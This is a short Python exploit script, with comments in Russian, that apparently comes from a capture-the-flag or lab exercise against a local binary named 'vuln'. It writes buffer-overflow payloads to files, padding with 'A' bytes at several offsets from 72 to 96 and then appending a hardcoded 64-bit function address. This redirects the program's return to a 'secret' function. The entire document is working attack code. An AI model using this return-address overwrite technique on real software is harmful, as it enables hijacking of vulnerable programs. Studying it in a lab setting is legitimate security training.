#!/usr/bin/env python3
import struct

# Адреса функций, полученные при запуске программы
secret_addr = 0x100ae4460
another_secret_addr = 0x100ae4488

# Попробуем использовать различные смещения
for offset in [72, 76, 80, 84, 88, 92, 96]:
    print(f"[*] Пробуем смещение: {offset}")
    
    # Создаем полезную нагрузку
    payload = b"A" * offset
    payload += struct.pack("<Q", another_secret_addr)  # 8 байт для 64-битного адреса
    
    # Записываем полезную нагрузку в файл
    with open(f"exploit_input_{offset}", "wb") as f:
        f.write(payload)
    
    print(f"[+] Эксплойт создан (offset: {offset})")
    print(f"[+] Используемый адрес: 0x{another_secret_addr:x}")
    print(f"[+] Запустите: ./vuln < exploit_input_{offset}") 